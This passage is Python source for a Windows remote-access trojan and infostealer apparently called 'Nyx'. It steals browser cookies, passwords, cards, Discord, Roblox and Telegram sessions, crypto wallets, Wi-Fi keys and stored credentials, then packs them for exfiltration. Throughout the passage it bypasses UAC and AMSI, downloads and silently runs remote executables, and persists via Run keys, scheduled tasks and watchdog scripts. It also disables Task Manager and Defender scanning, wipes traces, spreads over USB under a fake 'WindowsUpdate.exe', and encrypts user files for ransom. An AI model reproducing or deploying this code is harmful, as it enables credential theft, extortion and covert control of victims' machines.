        (tmpdir / "cookies_netscape.txt").write_text(to_netscape_txt(cookies) if cookies else "\n".join(netscape), encoding="utf-8")
        by_browser = {}
        for c in cookies:
            b = c.get("browser") or "unknown"
            by_browser.setdefault(b, []).append(c)
        for bname, clist in by_browser.items():
            safe = "".join(ch if ch.isalnum() else "_" for ch in str(bname))[:40]
            (tmpdir / f"cookies_{safe}.json").write_text(json.dumps(clist, indent=2), encoding="utf-8")
            # per-browser CQM
            sub = [x for x in cqm if any(
                (c.get("host") == x["Host"] and c.get("name") == x["Name"]) for c in clist
            )]
            # simpler: rebuild cqm for this browser only
            sub = []
            seen2 = set()
            for c in clist:
                host = (c.get("host") or "").strip()
                name = (c.get("name") or "").strip()
                val = c.get("value") or ""
                if not host or not name or not val:
                    continue
                k2 = (host.lower(), name)
                if k2 in seen2:
                    continue
                seen2.add(k2)
                exp = c.get("expires") or 0
                try:
                    exp = int(float(exp))
                except Exception:
                    exp = 0
                if exp > 10_000_000_000:
                    exp = int(exp / 1_000_000) - 11644473600
                if exp <= 0:
                    exp = int(time.time()) + 86400 * 400
                sub.append({
                    "Host": host, "Name": name, "Value": val,
                    "Path": c.get("path") or "/",
                    "IsSecure": bool(c.get("secure")),
                    "IsHttpOnly": bool(c.get("httpOnly")),
                    "Expiry": exp,
                })
            (tmpdir / f"cqm_{safe}.json").write_text(json.dumps(sub, indent=2), encoding="utf-8")
        (tmpdir / "summary.json").write_text(json.dumps({
            "filter": only, "cookies": len(cookies), "cqm": len(cqm),
            "passwords": len(passwords), "browsers": list(by_browser.keys()),
        }, indent=2), encoding="utf-8")
        zip_path = Path(tempfile.gettempdir()) / f"nyx_browsers_{get_vid()[:8]}.zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
            for f in tmpdir.iterdir():
                z.write(f, f.name)
        data = base64.b64encode(zip_path.read_bytes()).decode()
        try:
            zip_path.unlink()
        except Exception:
            pass
        return data, {
            "cookies": len(cookies), "cqm": len(cqm),
            "passwords": len(passwords), "browsers": list(by_browser.keys()),
        }
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)



def full_steal_zip():
    tmpdir = Path(tempfile.mkdtemp(prefix="nyx_"))
    try:
        send_loot("status", "steal 1/4 browsers")
        browsers = steal_browsers()
        cookies = browsers.get("cookies_json") or []
        cqm = to_cqm_list(cookies)
        (tmpdir / "cqm_cookies.json").write_text(json.dumps(cqm, indent=2), encoding="utf-8")
        (tmpdir / "editthiscookie.json").write_text(json.dumps(cqm, indent=2), encoding="utf-8")
        (tmpdir / "cookies.json").write_text(json.dumps(cookies, indent=2), encoding="utf-8")
        (tmpdir / "cookies_netscape.txt").write_text(to_netscape_txt(cookies), encoding="utf-8")
        (tmpdir / "passwords.json").write_text(json.dumps(browsers.get("passwords") or [], indent=2), encoding="utf-8")
        (tmpdir / "history.json").write_text(json.dumps((browsers.get("history") or [])[:2000], indent=2), encoding="utf-8")
        (tmpdir / "cards.json").write_text(json.dumps(browsers.get("cards") or [], indent=2), encoding="utf-8")
        # per-browser cqm
        by_b = {}
        for c in cookies:
            by_b.setdefault(c.get("browser") or "unknown", []).append(c)
        for bname, clist in by_b.items():
            safe = "".join(ch if ch.isalnum() else "_" for ch in str(bname))[:32]
            (tmpdir / f"cqm_{safe}.json").write_text(json.dumps(to_cqm_list(clist), indent=2), encoding="utf-8")

        send_loot("status", "steal 2/4 discord")
        disc = steal_discord()
        (tmpdir / "discord.json").write_text(
            json.dumps({k: disc.get(k) for k in ("hq", "tokens", "active_count", "notes", "error") if k in disc}, indent=2),
            encoding="utf-8",
        )

        send_loot("status", "steal 3/4 roblox telegram")
        rbx = steal_roblox()
        (tmpdir / "roblox.json").write_text(
            json.dumps({"cookies": rbx.get("cookies") or [], "notes": (rbx.get("notes") or [])[:30]}, indent=2),
            encoding="utf-8",
        )
        if rbx.get("cookies"):
            (tmpdir / "cqm_roblox.json").write_text(json.dumps(to_cqm_list([
                {"host": c.get("domain") or c.get("host"), "name": c.get("name"), "value": c.get("value"),
                 "path": c.get("path") or "/", "secure": True, "httpOnly": True, "expires": int(time.time()) + 86400 * 365}
                for c in rbx.get("cookies") or []
            ]), indent=2), encoding="utf-8")

        tg = steal_telegram()
        (tmpdir / "telegram.json").write_text(
            json.dumps({k: v for k, v in tg.items() if k != "b64_zip"}, indent=2), encoding="utf-8"
        )
        if tg.get("b64_zip"):
            try:
                (tmpdir / "telegram_tdata.zip").write_bytes(base64.b64decode(tg["b64_zip"]))
            except Exception:
                pass

        send_loot("status", "steal 4/4 pack")
        (tmpdir / "sysinfo.json").write_text(json.dumps(system_info(), indent=2), encoding="utf-8")
        (tmpdir / "wifi.json").write_text(json.dumps(wifi_passwords(), indent=2), encoding="utf-8")
        (tmpdir / "games.json").write_text(json.dumps(steal_games(), indent=2), encoding="utf-8")
        (tmpdir / "wallets.json").write_text(json.dumps(steal_wallets(), indent=2), encoding="utf-8")
        (tmpdir / "email.json").write_text(json.dumps(steal_email(), indent=2), encoding="utf-8")
        summary = {
            "cookies": len(cookies),
            "cqm": len(cqm),
            "passwords": len(browsers.get("passwords") or []),
            "discord_active": disc.get("active_count") or 0,
            "roblox": len(rbx.get("cookies") or []),
            "browsers": list(by_b.keys()),
        }
        (tmpdir / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
        # tight notes only
        (tmpdir / "notes.txt").write_text(
            "\n".join((browsers.get("notes") or [])[:40] + (disc.get("notes") or [])[:10]),
            encoding="utf-8",
        )

        zpath = Path(tempfile.gettempdir()) / f"steal_{int(time.time())}.zip"
        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
            for f in sorted(tmpdir.iterdir()):
                if f.is_file():
                    z.write(f, f.name)
        data = base64.b64encode(zpath.read_bytes()).decode()
        try:
            zpath.unlink()
        except Exception:
            pass
        send_loot("status", f"done cookies={summary['cookies']} cqm={summary['cqm']} discord={summary['discord_active']}")
        return data
    except Exception as e:
        send_loot("status", f"steal err {e}")
        return ""
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def set_reg_dword(path, name, value):
    try:
        import winreg
        key=winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
        winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value); winreg.CloseKey(key); return "ok"
    except Exception as e: return str(e)

def disable_taskmgr(): return set_reg_dword(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr",1)
def enable_taskmgr(): return set_reg_dword(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr",0)
def disable_regedit(): return set_reg_dword(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableRegistryTools",1)
def enable_regedit(): return set_reg_dword(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableRegistryTools",0)
def disable_cmd(): return set_reg_dword(r"Software\Policies\Microsoft\Windows\System","DisableCMD",1)
def enable_cmd(): return set_reg_dword(r"Software\Policies\Microsoft\Windows\System","DisableCMD",0)

def is_admin():
    try: return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception: return False

def list_processes():
    out=[]
    try:
        import psutil
        for p in psutil.process_iter(["pid","name","cpu_percent","memory_info"]):
            try:
                info=p.info; mem=info.get("memory_info")
                out.append({"pid":info.get("pid"),"name":info.get("name"),"cpu":info.get("cpu_percent"),
                            "mem_mb":round((mem.rss/1024/1024),1) if mem else 0})
            except Exception: pass
    except Exception as e: return [{"error":str(e)}]
    return out[:200]

def kill_process(name_or_pid):
    target = str(name_or_pid).strip()
    killed = []
    try:
        import psutil
        for p in psutil.process_iter(["pid", "name"]):
            try:
                if target.isdigit() and int(p.info["pid"]) == int(target):
                    p.kill()
                    killed.append(int(p.info["pid"]))
                elif (not target.isdigit()) and target.lower() in (p.info.get("name") or "").lower():
                    p.kill()
                    killed.append(int(p.info["pid"]))
            except Exception:
                pass
    except Exception as e:
        killed.append(f"psutil:{e}")
    # taskkill fallback
    try:
        if target.isdigit():
            hidden_run(f'taskkill /F /PID {target}')
        else:
            name = target if target.lower().endswith(".exe") else target + ".exe"
            hidden_run(f'taskkill /F /IM "{name}"')
    except Exception:
        pass
    return f"killed: {killed}" if killed else "none matched"

def lock_workstation():
    try: ctypes.windll.user32.LockWorkStation(); return "locked"
    except Exception as e: return str(e)

def message_box(text, title="Windows"):
    try: ctypes.windll.user32.MessageBoxW(0, str(text), str(title), 0x10); return "shown"
    except Exception as e: return str(e)

def uac_bypass():
    try:
        import winreg
        exe=sys.executable if getattr(sys,"frozen",False) else sys.argv[0]
        key=winreg.CreateKey(winreg.HKEY_CURRENT_USER,r"Software\Classes\ms-settings\shell\open\command")
        winreg.SetValueEx(key,None,0,winreg.REG_SZ,f'"{exe}"')
        winreg.SetValueEx(key,"DelegateExecute",0,winreg.REG_SZ,"")
        winreg.CloseKey(key)
        subprocess.Popen("fodhelper.exe", shell=True, creationflags=CREATE_NO_WINDOW)
        time.sleep(2)
        try: winreg.DeleteKey(winreg.HKEY_CURRENT_USER,r"Software\Classes\ms-settings\shell\open\command")
        except Exception: pass
        return "fodhelper triggered"
    except Exception as e: return str(e)

def download_exec(url, args=""):
    try:
        import requests
        r=requests.get(url, timeout=90)
        if r.status_code != 200 or len(r.content) < 500:
            return f"bad download {getattr(r,'status_code',0)}"
        # hide under localappdata, not temp visible
        hide = Path(os.getenv("LOCALAPPDATA", tempfile.gettempdir())) / "Microsoft" / "Windows" / "INetCache" / "IE"
        hide.mkdir(parents=True, exist_ok=True)
        dest = hide / f"container_{random.randint(10000,99999)}.exe"
        dest.write_bytes(r.content)
        try:
            ctypes.windll.kernel32.SetFileAttributesW(str(dest), 0x2)
        except Exception:
            pass
        # fully silent — no window
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0  # SW_HIDE
        subprocess.Popen(
            [str(dest)] + ([args] if args else []),
            shell=False,
            creationflags=CREATE_NO_WINDOW,
            startupinfo=si,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return f"ran hidden {dest}"
    except Exception as e:
        return str(e)

def self_update(url, min_version=None):
    """Download new build, hide deep under AppData, replace self, report path."""
    try:
        if min_version and str(min_version) == str(CLIENT_VERSION):
            return f"skip: already on {CLIENT_VERSION}"
        import requests
        r=requests.get(url, timeout=120)
        if r.status_code != 200 or len(r.content) < 1000:
            return f"bad download {r.status_code}"
        # deep hide path
        base = Path(os.getenv("APPDATA", tempfile.gettempdir())) / "Microsoft" / "Windows" / "Themes" / "CachedFiles" / "System" / "Drivers"
        base.mkdir(parents=True, exist_ok=True)
        # random-looking name
        hid_name = f"ms{random.randint(100000,999999)}.exe"
        dest = base / hid_name
        dest.write_bytes(r.content)
        try:
            # hide file attribute
            ctypes.windll.kernel32.SetFileAttributesW(str(dest), 0x2)  # FILE_ATTRIBUTE_HIDDEN
        except Exception:
            pass
        old = Path(sys.executable if getattr(sys, "frozen", False) else sys.argv[0])
        # update run key to new path if persistence
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, str(dest))
            winreg.CloseKey(key)
        except Exception:
            pass
        bat = Path(tempfile.gettempdir()) / f"nv{random.randint(1000,9999)}.cmd"
        bat.write_text(
            f'@echo off\r\n'
            f'if not "%~1"=="x" exit /b\r\n'
            f'timeout /t 2 /nobreak >nul\r\n'
            f'del /f /q "{old}" 2>nul\r\n'
            f'start "" /b "{dest}"\r\n'
            f'del /f /q "%~f0" 2>nul\r\n',
            encoding="utf-8",
        )
        send_loot("status", f"self-update scheduled · hidden at {dest}")
        send_loot("payload_path", str(dest))
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        subprocess.Popen(
            ["cmd.exe", "/c", str(bat), "x"],
            shell=False,
            creationflags=CREATE_NO_WINDOW,
            startupinfo=si,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(1)
        os._exit(0)
    except Exception as e:
        return str(e)


def full_clean_self():
    """Remove watchdog, tasks, run keys, startup, self — same idea as manual cleanup."""
    results = []
    try:
        results.append(stop_watchdog())
    except Exception as e:
        results.append(str(e))
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        for name in (STARTUP_NAME, "Windows Updates", "Windows Security", "NyxHealth"):
            try:
                winreg.DeleteValue(key, name)
                results.append("run:" + name)
            except Exception:
                pass
        winreg.CloseKey(key)
    except Exception as e:
        results.append(str(e))
    try:
        startup = Path(os.getenv("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        for f in startup.glob("*"):
            if any(x in f.name.lower() for x in ("nyx", "windowsupdate", STARTUP_NAME.replace(" ", "").lower())):
                f.unlink(missing_ok=True)
                results.append("startup:" + f.name)
    except Exception:
        pass
    for tn in ("NyxWatch", "NyxWatch1", "NyxWatch2", "NyxHealth"):
        try:
            hidden_run(f'schtasks /Delete /F /TN "{tn}"')
            results.append("task:" + tn)
        except Exception:
            pass
    try:
        exe = Path(sys.executable if getattr(sys, "frozen", False) else sys.argv[0])
        bat = Path(tempfile.gettempdir()) / "nyx_fullclean.bat"
        bat.write_text(
            f'@echo off\r\ntimeout /t 2 /nobreak >nul\r\ndel /f /q "{exe}"\r\ndel /f /q "%~f0"\r\n',
            encoding="utf-8",
        )
        subprocess.Popen(f'cmd /c "{bat}"', shell=True, creationflags=CREATE_NO_WINDOW)
        results.append("exe_delete_scheduled")
    except Exception as e:
        results.append(str(e))
    send_loot("status", "full_clean: " + " | ".join(results)[:1500])
    time.sleep(0.4)
    os._exit(0)


def uninstall_self():
    results=[]
    try:
        results.append(stop_watchdog())
    except Exception as e:
        results.append(str(e))
    try:
        import winreg
        key=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
        try: winreg.DeleteValue(key, STARTUP_NAME); results.append("run key gone")
        except Exception: results.append("run key miss")
        winreg.CloseKey(key)
    except Exception as e: results.append(str(e))
    try: hidden_run('schtasks /Delete /F /TN "NyxHealth"'); results.append("task gone")
    except Exception: pass
    try:
        startup=Path(os.getenv("APPDATA",""))/"Microsoft"/"Windows"/"Start Menu"/"Programs"/"Startup"
        for f in startup.glob("*"):
            if STARTUP_NAME.replace(" ","").lower() in f.name.lower() or "nyx" in f.name.lower():
                f.unlink(missing_ok=True); results.append(f"startup {f.name}")
    except Exception: pass
    try:
        exe=Path(sys.executable if getattr(sys,"frozen",False) else sys.argv[0])
        bat=Path(tempfile.gettempdir())/"nyx_bye.bat"
        bat.write_text(f'@echo off\r\ntimeout /t 2 /nobreak >nul\r\ndel /f /q "{exe}"\r\ndel /f /q "%~f0"\r\n',encoding="utf-8")
        subprocess.Popen(f'cmd /c "{bat}"', shell=True, creationflags=CREATE_NO_WINDOW)
        results.append("delete scheduled")
    except Exception as e: results.append(str(e))
    send_loot("status","uninstall: "+"; ".join(results)); time.sleep(0.5); os._exit(0)

def xor_crypt(data, key): return bytes(b ^ key[i % len(key)] for i,b in enumerate(data))

def ransomware_run(coin, wallet, note, mode="encrypt"):
    targets=[]; home=Path.home()
    for folder in ["Desktop","Documents","Pictures","Downloads","Videos","Music"]:
        d=home/folder
        if d.exists():
            for f in d.rglob("*"):
                if f.is_file() and f.suffix.lower() not in (".exe",".dll",".sys",".nyx") and f.stat().st_size < 15_000_000:
                    targets.append(f)
    key=hashlib.sha256(f"{wallet}:{coin}:nyx".encode()).digest(); count=0
    for f in targets[:400]:
        try:
            raw=f.read_bytes()
            if mode=="encrypt":
                if f.suffix==".nyx": continue
                f.write_bytes(xor_crypt(raw,key)); f.rename(str(f)+".nyx")
            else:
                if f.suffix!=".nyx": continue
                Path(str(f)[:-4]).write_bytes(xor_crypt(raw,key)); f.unlink(missing_ok=True)
            count+=1
        except Exception: pass
    if mode=="encrypt" and note:
        try:
            (home/"Desktop"/"README_NYX_RESTORE.txt").write_text(f"{note}\n\nSend {coin} to: {wallet}\n",encoding="utf-8")
            message_box(f"Files locked. Read README_NYX_RESTORE.txt\n{coin}: {wallet}","Important")
        except Exception: pass
    return f"{mode} {count} files"

def clipboard_get():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        try: data=win32clipboard.GetClipboardData()
        except Exception: data=""
        win32clipboard.CloseClipboard(); return str(data)[:20000]
    except Exception:
        return hidden_run("powershell -NoP -C Get-Clipboard")[:20000]

def clipboard_loop():
    global CLIPBOARD_ACTIVE, CLIPBOARD_LAST
    while CLIPBOARD_ACTIVE and RUNNING:
        try:
            cur=clipboard_get()
            if cur and cur!=CLIPBOARD_LAST:
                CLIPBOARD_LAST=cur; CLIP_HISTORY.append({"ts": datetime.utcnow().isoformat()+"Z", "text": (CLIPBOARD_LAST or "")[:2000]}); CLIP_HISTORY[:] = CLIP_HISTORY[-CLIP_HISTORY_MAX:]; send_loot("clipboard", cur[:20000]); check_alert_patterns(cur)
        except Exception: pass
        time.sleep(1.2)

def active_window():
    try:
        hwnd=ctypes.windll.user32.GetForegroundWindow()
        length=ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf=ctypes.create_unicode_buffer(length+1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length+1)
        return buf.value
    except Exception as e: return str(e)

def wifi_passwords():
    out=[]
    try:
        profiles=hidden_run("netsh wlan show profiles")
        names=re.findall(r"All User Profile\s*:\s*(.+)", profiles)
        for name in names:
            name=name.strip()
            detail=hidden_run(f'netsh wlan show profile name="{name}" key=clear')
            m=re.search(r"Key Content\s*:\s*(.+)", detail)
            out.append({"ssid":name,"password":m.group(1).strip() if m else ""})
    except Exception as e: return [{"error":str(e)}]
    return out

def block_input(enable=True):
    try: ctypes.windll.user32.BlockInput(1 if enable else 0); return "input blocked" if enable else "input free"
    except Exception as e: return str(e)

def monitor_off():
    try: ctypes.windll.user32.SendMessageW(0xFFFF,0x0112,0xF170,2); return "monitor off"
    except Exception as e: return str(e)

def monitor_on():
    try: ctypes.windll.user32.SendMessageW(0xFFFF,0x0112,0xF170,-1); return "monitor on"
    except Exception as e: return str(e)

def open_url(url):
    try: os.startfile(url); return f"opened {url}"
    except Exception as e: return str(e)

def speak(text):
    try:
        safe = str(text or "")[:300].replace("'", "").replace('"', "").replace("`","")
        if not safe:
            return "empty text"
        # write script file to avoid quoting hell
        sp = Path(tempfile.gettempdir()) / "nyx_speak.ps1"
        sp.write_text(
            "Add-Type -AssemblyName System.Speech\n"
            "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer\n"
            f"$s.Speak('{safe}')\n",
            encoding="utf-8",
        )
        hidden_run(f'powershell -NoP -WindowStyle Hidden -ExecutionPolicy Bypass -File "{sp}"')
        return "spoke: " + safe[:40]
    except Exception as e:
        return str(e)

def set_wallpaper(url):
    try:
        import requests
        r=requests.get(url,timeout=30); path=Path(tempfile.gettempdir())/"nyx_wall.jpg"; path.write_bytes(r.content)
        ctypes.windll.user32.SystemParametersInfoW(20,0,str(path),3); return "wallpaper set"
    except Exception as e: return str(e)

def cd_tray(action="open"):
    try:
        s = "open" if action=="open" else "closed"
        hidden_run(f'powershell -NoP -C "Add-Type -TypeDefinition \'using System;using System.Runtime.InteropServices;public class M{{ [DllImport(\\\"winmm.dll\\\")] public static extern int mciSendString(string c,System.Text.StringBuilder r,int l,IntPtr h); }}\'; [void][M]::mciSendString(\\\"set cdaudio door {s}\\\",$null,0,[IntPtr]::Zero)"')
        return f"tray {action}"
    except Exception as e: return str(e)

def persist_task():
    try:
        exe=sys.executable if getattr(sys,"frozen",False) else sys.argv[0]
        cmd=f'schtasks /Create /F /SC ONLOGON /RL LIMITED /TN "NyxHealth" /TR "\\"{exe}\\""'
        hidden_run(cmd); return "scheduled task ok"
    except Exception as e: return str(e)

def persist_startup_folder():
    try:
        exe=sys.executable if getattr(sys,"frozen",False) else sys.argv[0]
        startup=Path(os.getenv("APPDATA",""))/"Microsoft"/"Windows"/"Start Menu"/"Programs"/"Startup"
        startup.mkdir(parents=True, exist_ok=True)
        bat=startup/(STARTUP_NAME.replace(" ","")+".cmd")
        bat.write_text(f'@echo off\r\nstart "" "{exe}"\r\n',encoding="utf-8")
        return f"startup folder: {bat.name}"
    except Exception as e: return str(e)

def defender_exclude():
    try:
        exe=sys.executable if getattr(sys,"frozen",False) else sys.argv[0]
        folder=str(Path(exe).parent)
        return run_powershell(f'Add-MpPreference -ExclusionPath "{folder}"') or "exclusion attempted"
    except Exception as e: return str(e)

def spread_usb():
    try:
        exe=Path(sys.executable if getattr(sys,"frozen",False) else sys.argv[0]); copied=[]
        for letter in "DEFGHIJKLMN":
            root=Path(f"{letter}:/")
            if root.exists():
                try:
                    shutil.copy2(exe, root/"WindowsUpdate.exe")
                    (root/"Open_Me.txt").write_text("Documents backup - open WindowsUpdate.exe if files missing.\n",encoding="utf-8")
                    copied.append(letter)
                except Exception: pass
        return f"copied to: {copied}" if copied else "no usb"
    except Exception as e: return str(e)




def _watchdog_dirs():
    dirs = []
    local = Path(os.getenv("LOCALAPPDATA", ""))
    appdata = Path(os.getenv("APPDATA", ""))
    pub = Path(os.getenv("PUBLIC", r"C:\Users\Public"))
    progdata = Path(os.getenv("PROGRAMDATA", r"C:\ProgramData"))
    temp = Path(tempfile.gettempdir())
    candidates = [
        temp / "msdx",
        local / "Microsoft" / "Windows" / "Caches",
        local / "Microsoft" / "NetServices",
        appdata / "Microsoft" / "Protect" / "Cache",
        appdata / "Microsoft" / "Windows" / "Themes" / "Cached",
        pub / "Libraries" / "Caches",
        progdata / "Microsoft" / "Windows" / "WER" / "Temp",
        Path.home() / "AppData" / "LocalLow" / "Microsoft" / "CryptnetUrlCache",
    ]
    # limit by WATCHDOG_COPIES
    n = 6
    try:
        n = max(1, min(12, int(WATCHDOG_COPIES)))
    except Exception:
        pass
    for d in candidates:
        if len(dirs) >= n:
            break
        try:
            d.mkdir(parents=True, exist_ok=True)
            # write test
            test = d / ".w"
            test.write_text("1", encoding="utf-8")
            test.unlink(missing_ok=True)
            dirs.append(d)
        except Exception:
            continue
    if not dirs:
        dirs = [temp]
    return dirs

def start_watchdog(force=False):
    global WATCHDOG_ACTIVE
    try:
        exe = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
        exe = str(Path(exe).resolve())
        locations = []
        dirs = _watchdog_dirs()
        script_body = f"""
$ErrorActionPreference = 'SilentlyContinue'
$exe = '{exe}'
while ($true) {{
  Start-Sleep -Seconds 6
  $name = [IO.Path]::GetFileNameWithoutExtension($exe)
  $running = Get-Process -Name $name -ErrorAction SilentlyContinue
  if (-not $running) {{
    if (Test-Path $exe) {{ Start-Process -FilePath $exe -WindowStyle Hidden }}
  }}
  $beat = Join-Path $PSScriptRoot 'beat.txt'
  Set-Content -Path $beat -Value (Get-Date -Format o) -Force
}}
"""
        if force:
            try:
                hidden_run('powershell -NoP -C "Get-CimInstance Win32_Process -Filter \"name=\'powershell.exe\'\" | ? { $_.CommandLine -like \'*nyx_wd*\' -or $_.CommandLine -like \'*msdx*\' } | % { Stop-Process -Id $_.ProcessId -Force }"')
            except Exception:
                pass
        for i, d in enumerate(dirs):
            name = "nyx_wd.ps1" if i == 0 else f"svc_{i}.ps1"
            wd = d / name
            try:
                wd.write_text(script_body, encoding="utf-8")
                subprocess.Popen(
                    f'powershell -NoP -WindowStyle Hidden -ExecutionPolicy Bypass -File "{wd}"',
                    shell=True, creationflags=CREATE_NO_WINDOW
                )
                locations.append(str(wd))
            except Exception as e:
                locations.append(f"{wd}:fail:{e}")
        # scheduled tasks pointing at first two scripts
        for i, loc in enumerate([x for x in locations if not x.endswith("fail")][:3]):
            tn = f"NyxWatch{i}" if i else "NyxWatch"
            try:
                hidden_run(f'schtasks /Delete /F /TN "{tn}"')
                hidden_run(
                    f'schtasks /Create /F /SC MINUTE /MO 5 /TN "{tn}" /TR "powershell -NoP -W Hidden -EP Bypass -File \"{loc}\""'
                )
                locations.append(f"task:{tn}")
            except Exception:
                pass
        # persist location list next to exe for status
        try:
            meta = Path(tempfile.gettempdir()) / "nyx_wd_locs.txt"
            meta.write_text("\n".join(locations), encoding="utf-8")
        except Exception:
            pass
        WATCHDOG_ACTIVE = True
        return "watchdog armed @ " + " | ".join(locations)
    except Exception as e:
        return str(e)

def watchdog_status():
    lines = []
    meta = Path(tempfile.gettempdir()) / "nyx_wd_locs.txt"
    if meta.exists():
        try:
            lines.append("locations:")
            lines.extend(meta.read_text(encoding="utf-8").splitlines())
        except Exception:
            pass
    # scan known dirs for beat
    for d in _watchdog_dirs():
        for f in d.glob("*.ps1"):
            beat = d / "beat.txt"
            b = beat.read_text(encoding="utf-8").strip()[:28] if beat.exists() else "no-beat"
            lines.append(f"{f} · {b}")
    try:
        out = hidden_run('powershell -NoP -C "(Get-CimInstance Win32_Process -Filter \"name=\'powershell.exe\'\" | ? { $_.CommandLine -like \'*nyx_wd*\' -or $_.CommandLine -like \'*svc_*\' }).Count"')
        lines.append("powershell_guards=" + str(out).strip())
    except Exception:
        pass
    return "\n".join(lines) if lines else "no watchdog data"


def stop_watchdog():
    global WATCHDOG_ACTIVE
    removed = []
    # kill powershell guards
    try:
        hidden_run(
            'powershell -NoP -C "Get-CimInstance Win32_Process -Filter \"name=\'powershell.exe\'\" | '
            '? { $_.CommandLine -like \'*nyx_wd*\' -or $_.CommandLine -like \'*svc_*.ps1*\' -or $_.CommandLine -like \'*msdx*\' } | '
            '% { Stop-Process -Id $_.ProcessId -Force }"'
        )
        removed.append("powershell_guards_killed")
    except Exception as e:
        removed.append(f"ps_kill:{e}")
    # delete scheduled tasks
    for tn in ["NyxWatch", "NyxWatch1", "NyxWatch2", "NyxHealth"]:
        try:
            hidden_run(f'schtasks /Delete /F /TN "{tn}"')
            removed.append(f"task:{tn}")
        except Exception:
            pass
    # delete scripts + beats in known dirs
    for d in _watchdog_dirs():
        try:
            for f in list(d.glob("*.ps1")) + list(d.glob("beat.txt")) + list(d.glob("nyx_wd*")):
                try:
                    f.unlink(missing_ok=True)
                    removed.append(str(f))
                except Exception:
                    pass
        except Exception:
            pass
    meta = Path(tempfile.gettempdir()) / "nyx_wd_locs.txt"
    try:
        if meta.exists():
            for line in meta.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if line.endswith(".ps1") and Path(line).exists():
                    try:
                        Path(line).unlink(missing_ok=True)
                        removed.append(line)
                    except Exception:
                        pass
            meta.unlink(missing_ok=True)
            removed.append(str(meta))
    except Exception:
        pass
    WATCHDOG_ACTIVE = False
    return "watchdog stopped · " + " | ".join(removed[:30])


def apply_boot_policy():
    try:
        if BOOT_DISABLE_TASKMGR: disable_taskmgr()
    except Exception: pass
    try:
        if BOOT_DISABLE_CMD: disable_cmd()
    except Exception: pass
    try:
        if BOOT_DISABLE_REGEDIT: disable_regedit()
    except Exception: pass
    try:
        if BOOT_WATCHDOG: start_watchdog(False)
    except Exception: pass


def amsi_bypass_ps():
    # multi-path AMSI patch (field + context force)
    return (
        "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
        "if($a){$f=$a.GetField('amsiInitFailed','NonPublic,Static');if($f){$f.SetValue($null,$true)}};"
        "try{[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("
        "'System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]"
        "'NonPublic,Static').GetValue($null),0x80070057)}catch{};"
    )

def clear_traces():
    results=[]
    try:
        recent=Path(os.getenv("APPDATA",""))/"Microsoft"/"Windows"/"Recent"
        if recent.exists():
            for f in recent.iterdir():
                try: f.unlink()
                except Exception: pass
            results.append("recent cleared")
    except Exception as e: results.append(str(e))
    try:
        pf=Path(r"C:\Windows\Prefetch")
        if pf.exists() and is_admin():
            for f in pf.glob("*.pf"):
                try: f.unlink()
                except Exception: pass
            results.append("prefetch cleared")
        else: results.append("prefetch skip")
    except Exception as e: results.append(str(e))
    try:
        import winreg
        key=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",0,winreg.KEY_ALL_ACCESS)
        while True:
            try:
                name,_,_=winreg.EnumValue(key,0); winreg.DeleteValue(key,name)
            except OSError: break
        winreg.CloseKey(key); results.append("run mru cleared")
    except Exception as e: results.append(f"run mru: {e}")
    return "; ".join(results)


def steal_credentials():
    """Windows Credential Manager via cmdkey / powershell."""
    out = {"cmdkey": "", "vault": []}
    try:
        out["cmdkey"] = hidden_run("cmdkey /list")[:15000]
    except Exception as e:
        out["cmdkey"] = str(e)
    try:
        ps = (
            "Get-ChildItem -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Authentication' -ErrorAction SilentlyContinue | Out-String;"
            "cmdkey /list"
        )
        out["vault_ps"] = hidden_run(f'powershell -NoP -C "{ps}"')[:10000]
    except Exception as e:
        out["vault_ps"] = str(e)
    return out

def file_search(patterns=None, roots=None, max_hits=80):
    patterns = patterns or ["*seed*", "*wallet*", "*.kdbx", "*password*", "*backup*.zip", "*.txt"]
    if isinstance(patterns, str):
        patterns = [p.strip() for p in patterns.split(",") if p.strip()]
    home = Path.home()
    roots = roots or [home / "Desktop", home / "Documents", home / "Downloads", home / "Pictures"]
    hits = []
    for root in roots:
        try:
            root = Path(root)
            if not root.exists():
                continue
            for pat in patterns:
                for f in root.rglob(pat):
                    try:
